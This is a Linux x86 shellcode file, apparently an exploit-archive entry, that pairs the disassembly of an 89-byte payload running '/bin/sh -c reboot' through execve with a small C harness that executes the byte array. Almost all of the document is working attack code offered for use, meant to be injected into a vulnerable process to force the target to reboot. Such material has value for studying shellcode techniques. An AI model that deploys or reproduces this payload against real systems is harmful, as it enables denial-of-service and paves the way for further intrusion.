/*
# Name: "Linux reboot (bin/sh -c reboot) shellcode" (89 bytes)
# Platform: Linux 32 and 64 bit
# Author: Ashiyane Digital Security Team ~ MALWaRE43
# Contact: usertester123546 [at] gmail.com
# Tested on:
Linux javadkhof 4.4.0-47-generic #68-Ubuntu SMP Wed Oct 26 19:39:52 UTC
2016 x86_64 x86_64 x86_64 GNU/Linux
Linux navid 4.6.0-kali1-686-pae #1 SMP Debian 4.6.4-1kali1 (2016-07-21)
i686 GNU/Linux
—------------------------------------------------------------------------------
Disassembly of section .shellcode:

08049060 <_start>:
  8049060:  eb 30                  jmp    8049092 <mycall>

08049062 <shellcode>:
  8049062:  5e                     pop    %esi
  8049063:  31 c0                  xor    %eax,%eax
  8049065:  88 46 07               mov    %al,0x7(%esi)
  8049068:  88 46 0a               mov    %al,0xa(%esi)
  804906b:  88 46 11               mov    %al,0x11(%esi)
  804906e:  89 76 12               mov    %esi,0x12(%esi)
  8049071:  8d 5e 08               lea    0x8(%esi),%ebx
  8049074:  89 5e 16               mov    %ebx,0x16(%esi)
  8049077:  8d 5e 0b               lea    0xb(%esi),%ebx
  804907a:  89 5e 1a               mov    %ebx,0x1a(%esi)
  804907d:  89 46 1e               mov    %eax,0x1e(%esi)
  8049080:  b0 0b                  mov    $0xb,%al
  8049082:  89 f3                  mov    %esi,%ebx
  8049084:  8d 4e 12               lea    0x12(%esi),%ecx
  8049087:  8d 56 1e               lea    0x1e(%esi),%edx
  804908a:  cd 80                  int    $0x80
  804908c:  b0 01                  mov    $0x1,%al
  804908e:  31 db                  xor    %ebx,%ebx
  8049090:  cd 80                  int    $0x80

08049092 <mycall>:
  8049092:  e8 cb ff ff ff         call   8049062 <shellcode>
  8049097:  2f                     das
  8049098:  62 69 6e               bound  %ebp,0x6e(%ecx)
  804909b:  2f                     das
  804909c:  73 68                  jae    8049106 <_end+0x4a>
  804909e:  23 2d 63 23 72 65      and    0x65722363,%ebp
  80490a4:  62 6f 6f               bound  %ebp,0x6f(%edi)
  80490a7:  74 23                  je     80490cc <_end+0x10>
  80490a9:  41                     inc    %ecx
  80490aa:  41                     inc    %ecx
  80490ab:  41                     inc    %ecx
  80490ac:  41                     inc    %ecx
  80490ad:  42                     inc    %edx
  80490ae:  42                     inc    %edx
  80490af:  42                     inc    %edx
  80490b0:  42                     inc    %edx
  80490b1:  43                     inc    %ebx
  80490b2:  43                     inc    %ebx
  80490b3:  43                     inc    %ebx
  80490b4:  43                     inc    %ebx
  80490b5:  44                     inc    %esp
  80490b6:  44                     inc    %esp
  80490b7:  44                     inc    %esp
  80490b8:  44                     inc    %esp
—------------------------------------------------------------------------------
*/

#include <stdio.h>
#include <string.h>

unsigned char code[] =
"\xeb\x30\x5e\x31\xc0\x88\x46\x07\x88\x46\x0a\x88\x46\x11\x89\x76\x12\x8d\x5e\x08\x89\x5e\x16\x8d\x5e\x0b\x89\x5e\x1a\x89\x46\x1e\xb0\x0b\x89\xf3\x8d\x4e\x12\x8d\x56\x1e\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xcb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x2d\x63\x23\x72\x65\x62\x6f\x6f\x74\x23\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44";

void main(){
   printf("Shellcode Length:  %d\n", strlen(code));
   int (*ret)() = (int(*)())code;
   ret();
}